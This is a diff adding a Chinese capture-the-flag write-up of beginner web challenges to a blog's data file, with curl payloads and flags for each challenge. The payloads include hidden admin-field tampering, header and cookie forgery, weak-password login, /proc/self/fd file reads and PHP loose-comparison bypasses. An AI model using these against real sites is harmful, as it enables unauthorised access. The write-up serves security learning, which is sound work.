@@ -1109,7 +1109,367 @@ session["user_id"] = final_user.id  # ← 攻击者控制登录谁
 ---
 
 *生成时间: 2026-05-06*
-*博客地址: https://qiuyida.github.io/ctf-writeup-blog/*
+*博客地址: https://heliumsenbrg.github.io/ctf-writeup-blog/*
+`
+  },
+  "qingcen-web-2026-06-10": {
+    title: "青岑 CTF Web 入门 WriteUp",
+    subtitle: "2026-06-10 | 17/20 题解出",
+    content: `
+# 青岑 CTF Web 入门 WriteUp
+
+**日期**: 2026-06-10
+**平台**: 青岑 CTF (ctf.qingcen.net)
+**战绩**: 17/20 题解出，17 个 flags
+
+---
+
+## 📋 目录
+
+1. [basic (177) - HTML 注释泄露](#basic-177)
+2. [basic_1 (178) - Base64 解码](#basic_1-178)
+3. [basic_2 (179) - 隐藏字段修改](#basic_2-179)
+4. [basic_4 (181) - ASCII 数组解码](#basic_4-181)
+5. [basic_5 (182) - 加密 Payload 构造](#basic_5-182)
+6. [basic_6 (183) - 响应头泄露](#basic_6-183)
+7. [basic_8 (186) - .phps 源码泄露](#basic_8-186)
+8. [basic_9 (187) - robots.txt + 十六进制](#basic_9-187)
+9. [basic_13 (191) - 弱密码爆破](#basic_13-191)
+10. [basic_14 (192) - 文件描述符泄露](#basic_14-192)
+11. [ezrequest (184) - 混合请求方法](#ezrequest-184)
+12. [ezrequest_1 (185) - 请求头伪造](#ezrequest_1-185)
+13. [ezphp (201) - PHP 弱类型绕过](#ezphp-201)
+14. [ezphp_1 (202) - array_search 弱类型](#ezphp_1-202)
+15. [ezphp_2 (203) - 嵌套弱类型绕过](#ezphp_2-203)
+16. [web_test_2 (635) - 科学计数法绕过](#web_test_2-635)
+17. [技巧总结](#技巧总结)
+
+---
+
+## basic (177) - HTML 注释泄露
+
+**题目描述**: "万卷文章，不过引路之石；真相不在字里行间，而在纸面之下。善观者，自有慧眼识珠。F12一窥，当有所获。"
+
+**解题思路**: 查看 HTML 源码，寻找注释中的隐藏信息。
+
+**Payload**:
+\`\`\`bash
+curl -s "http://target/" | grep "<!--"
+\`\`\`
+
+**Flag**: \`flag{6e5ecb6c-de30-49dd-b5ce-6916a222ef8d}\`
+
+---
+
+## basic_1 (178) - Base64 解码
+
+**题目描述**: "姐姐说不许偷看，但规矩向来是用来破的。"
+
+**解题思路**: 在 HTML 注释中发现 Base64 编码的字符串。
+
+**Payload**:
+\`\`\`bash
+echo 'ZmxhZ3tkMGNkNmE5ZC0zOTAyLTQwN2QtODk4Yy0yOTM1NDdlNDZkODl9' | base64 -d
+\`\`\`
+
+**Flag**: \`flag{d0cd6a9d-3902-407d-898c-293547e46d89}\`
+
+---
+
+## basic_2 (179) - 隐藏字段修改
+
+**题目描述**: "既是前端所设，自可前端所改：掀帘窥源，改零作壹，堂门自启。"
+
+**解题思路**: 表单中有一个隐藏字段 \`is_admin\`，值为 \`0\`，需要改为 \`1\`。
+
+**Payload**:
+\`\`\`bash
+curl -X POST "http://target/index.php" -d "is_admin=1&nickname=test&contact=test@test.com&content=test"
+\`\`\`
+
+**Flag**: \`flag{cdc6480a-6cb7-422a-bf6a-2243b5964724}\`
+
+---
+
+## basic_4 (181) - ASCII 数组解码
+
+**题目描述**: "朱门有锁，非邀莫入。世人只见乱数铺陈，不识其间藏珠。字符不语，码中有码；解码见真，自得通关之钥。"
+
+**解题思路**: JavaScript 中有三个数组存储 ASCII 值，需要解码获取邀请码。
+
+**Payload**:
+\`\`\`python
+_0 = [81, 67, 67, 84, 70, 95, 86, 73, 80, 95, 50, 48, 50, 54]
+invite_code = ''.join(chr(c) for c in _0)  # QCCTF_VIP_2026
+
+# 提交邀请码
+curl -X POST "http://target/flag" -H "Content-Type: application/json" -d '{"code": "QCCTF_VIP_2026"}'
+\`\`\`
+
+**Flag**: \`flag{cefc9bae-61b6-4058-8d50-2516678af02f}\`
+
+---
+
+## basic_5 (182) - 加密 Payload 构造
+
+**题目描述**: "积分如山，千分可兑其赏。勤者手点百回，智者细读JS。领其真意，千分易得。"
+
+**解题思路**: 需要答对 1000 道计算题，但可以构造加密 payload 跳过答题。
+
+**Payload**:
+\`\`\`python
+import base64, json
+
+payload = {'score': 1000}
+encrypted = base64.b64encode(json.dumps(payload).encode()).decode()
+
+# 提交
+curl -X POST "http://target/claim" -H "Content-Type: application/json" -d '{"data": "'$encrypted'"}'
+
+# 解码响应
+response_encrypted = "eyJmbGFnIjogImZsYWd7ODg1MzNkNTItYmM3NC00ZDYwLWE0NTktNTk3ODkyZjIwMDMwfSJ9"
+flag = base64.b64decode(response_encrypted).decode()
+\`\`\`
+
+**Flag**: \`flag{88533d52-bc74-4d60-a459-597892f20030}\`
+
+---
+
+## basic_6 (183) - 响应头泄露
+
+**题目描述**: "眼中所见，不过一纸公文；真章不在纸面，而在纸外。细究来路，莫止步于表象——帷幕之后，自有洞天。bp抓包，玄机自现。"
+
+**解题思路**: Flag 隐藏在 HTTP 响应头 \`X-Flag\` 中。
+
+**Payload**:
+\`\`\`bash
+curl -s -I "http://target/" | grep "X-Flag"
+\`\`\`
+
+**Flag**: \`flag{b313891a-3e4f-4763-b321-8578e9b495fb}\`
+
+---
+
+## basic_8 (186) - .phps 源码泄露
+
+**题目描述**: "附：开发文档正在整理中，请相关的技术人员访问网站的源代码文件来获取相关信息。"
+
+**解题思路**: \`.phps\` 文件会泄露 PHP 源码，从中找到密码。
+
+**Payload**:
+\`\`\`bash
+# 获取源码
+curl -s "http://target/index.phps"
+
+# 发现密码: QCyYdS
+curl -s "http://target/index.php?a=QCyYdS"
+\`\`\`
+
+**Flag**: \`flag{310e5b85-4b69-4009-b9d3-78ada5f01fd5}\`
+
+---
+
+## basic_9 (187) - robots.txt + 十六进制
+
+**题目描述**: 检查 robots.txt 文件。
+
+**解题思路**: robots.txt 泄露了隐藏文件路径，文件内容是十六进制编码。
+
+**Payload**:
+\`\`\`bash
+# 检查 robots.txt
+curl -s "http://target/robots.txt"
+# User-agent: *
+# Disallow: /qcq.php
+
+# 访问泄露的文件
+curl -s "http://target/qcq.php"
+# 666c61677b36363161616361622d626664612d343730612d623330622d3034323663383564336363347d
+
+# 十六进制解码
+python3 -c "print(bytes.fromhex('666c61677b36363161616361622d626664612d343730612d623330622d3034323663383564336363347d').decode())"
+\`\`\`
+
+**Flag**: \`flag{661aacab-bfda-470a-b30b-0426c85d3cc4}\`
+
+---
+
+## basic_13 (191) - 弱密码爆破
+
+**题目描述**: 登录页面，用户名已知为 \`admin\`。
+
+**解题思路**: 使用常见弱密码进行爆破。
+
+**Payload**:
+\`\`\`bash
+curl -X POST "http://target/" -d "username=admin&password=admin123"
+\`\`\`
+
+**Flag**: \`flag{744f5050-6518-49e2-bd22-a1541b285938}\`
+
+---
+
+## basic_14 (192) - 文件描述符泄露
+
+**题目描述**: PHP 源码显示 \`readfile()\` 函数，文件名长度限制 < 17。
+
+**解题思路**: 使用 \`/proc/self/fd/\` 读取文件描述符。
+
+**Payload**:
+\`\`\`bash
+curl -s "http://target/?filename=/proc/self/fd/5"
+\`\`\`
+
+**Flag**: \`flag{925c1e99-bb2b-46ea-8952-04a29f9f24d6}\`
+
+---
+
+## ezrequest (184) - 混合请求方法
+
+**题目描述**: 需要同时使用 GET 和 POST 方法。
+
+**解题思路**: GET 参数放在 URL 中，POST 参数放在请求体中。
+
+**Payload**:
+\`\`\`bash
+curl -X POST "http://target/?a=QCCTF" -d "b=yyds"
+\`\`\`
+
+**Flag**: \`flag{393e4f1f-ad12-41a6-abc4-d2d6052af4ff}\`
+
+---
+
+## ezrequest_1 (185) - 请求头伪造
+
+**题目描述**: 需要伪造多个请求头绕过验证。
+
+**解题思路**: 依次伪造 X-Forwarded-For、User-Agent、Via、Cookie 头。
+
+**Payload**:
+\`\`\`bash
+curl -X POST "http://target/?a=a" -d "b=b" \\
+  -H "X-Forwarded-For: 127.0.0.1" \\
+  -H "User-Agent: QingcenSafe" \\
+  -H "X-Real-IP: 127.0.0.1" \\
+  -H "Via: xujinyingcangming.top" \\
+  -H "Cookie: user=admin; role=admin"
+\`\`\`
+
+**Flag**: \`flag{b46accae-064b-4fc7-9704-f00a768f1410}\`
+
+---
+
+## ezphp (201) - PHP 弱类型绕过
+
+**题目描述**: 需要满足 \`\$a == 0\` 且 \`\$a\` 为真，\`\$b > 2026\` 但 \`\$b\` 不是数字。
+
+**解题思路**: 利用 PHP 弱类型比较的特性。
+
+**Payload**:
+\`\`\`bash
+curl -s "http://target/?a=0abc&b=2027a"
+\`\`\`
+
+**原理**:
+- \`"0abc" == 0\` 为 true（字符串开头非数字则等于 0）
+- \`"0abc"\` 为 true（非空字符串）
+- \`"2027a" > 2026\` 为 true（自动转换为数字比较）
+- \`is_numeric("2027a")\` 为 false（包含字母）
+
+**Flag**: \`flag{3069542b-0878-43f6-9f11-ffc36074ffb0}\`
+
+---
+
+## ezphp_1 (202) - array_search 弱类型
+
+**题目描述**: \`array_search("QCCTF", \$qc)\` 的结果需要严格等于 1。
+
+**解题思路**: \`array_search\` 使用 \`==\` 比较，\`"QCCTF" == 0\` 为 true。
+
+**Payload**:
+\`\`\`bash
+curl -s 'http://target/?qc=["a","QCCTF"]'
+\`\`\`
+
+**原理**:
+- \`array_search("QCCTF", ["a", "QCCTF"])\` 返回 1
+- 因为 \`"QCCTF"\` 在索引 1 的位置
+
+**Flag**: \`flag{dbd14dcd-fa92-44ea-a1cd-6b8258037c47}\`
+
+---
+
+## ezphp_2 (203) - 嵌套弱类型绕过
+
+**题目描述**: 需要 "QCCTF" 在数组中，"QCyyds" 在子数组中，但子数组中没有严格等于 "QCyyds" 的元素。
+
+**解题思路**: 利用 \`==\` 和 \`===\` 的区别。
+
+**Payload**:
+\`\`\`bash
+curl -s 'http://target/?qc={"0":"QCCTF","n":[0]}'
+\`\`\`
+
+**原理**:
+- \`array_search("QCCTF", {"0":"QCCTF","n":[0]})\` 返回 "0"（不是 false）
+- \`array_search("QCyyds", [0])\` 返回 0（因为 \`"QCyyds" == 0\`）
+- 遍历 \`[0]\` 时，\`0 === "QCyyds"\` 为 false
+
+**Flag**: \`flag{1b4dce02-1a9b-438c-9260-de0bdbcc1b67}\`
+
+---
+
+## web_test_2 (635) - 科学计数法绕过
+
+**题目描述**: 需要 \`strlen(\$no) < 4\` 且 \`\$no > 88888888\`。
+
+**解题思路**: 使用科学计数法绕过长度限制。
+
+**Payload**:
+\`\`\`bash
+curl -s "http://target/secret_report.php?no=9e9"
+\`\`\`
+
+**原理**:
+- \`strlen("9e9")\` = 3（小于 4）
+- \`"9e9" > 88888888\` 为 true（9e9 = 9000000000）
+
+**Flag**: \`flag{23773722-0ca7-475c-8a4d-f172d540299b}\`
+
+---
+
+## 技巧总结
+
+### 信息泄露类
+1. **HTML 注释** - 检查 \`<!-- -->\` 注释
+2. **响应头** - 检查 X-Flag、X-Debug-Note 等头
+3. **robots.txt** - 检查 Disallow 路径
+4. **.phps 文件** - 访问 .phps 文件查看源码
+5. **/proc/self/fd/** - 文件描述符泄露
+6. **备份文件** - .bak、.swp、.git 等
+
+### 编码绕过类
+1. **Base64 解码** - 识别 Base64 编码的字符串
+2. **十六进制解码** - 识别 hex 编码的字符串
+3. **ASCII 数组** - 将数字数组转换为字符
+4. **科学计数法** - 绕过长度限制（如 \`9e9\`）
+
+### 请求伪造类
+1. **X-Forwarded-For** - 伪造客户端 IP
+2. **User-Agent** - 伪造浏览器标识
+3. **Via** - 伪造代理服务器
+4. **Cookie** - 伪造用户身份
+
+### PHP 弱类型类
+1. **\`==\` vs \`===\`** - 弱比较 vs 强比较
+2. **字符串转数字** - \`"0abc" == 0\`
+3. **array_search** - 使用 \`==\` 比较
+4. **0e MD5 碰撞** - \`QNKCDZO\` 等
+
+---
+
+*WriteUp 生成时间: 2026-06-10*
+*作者: heliumsenbrg*
 `
   }
 }
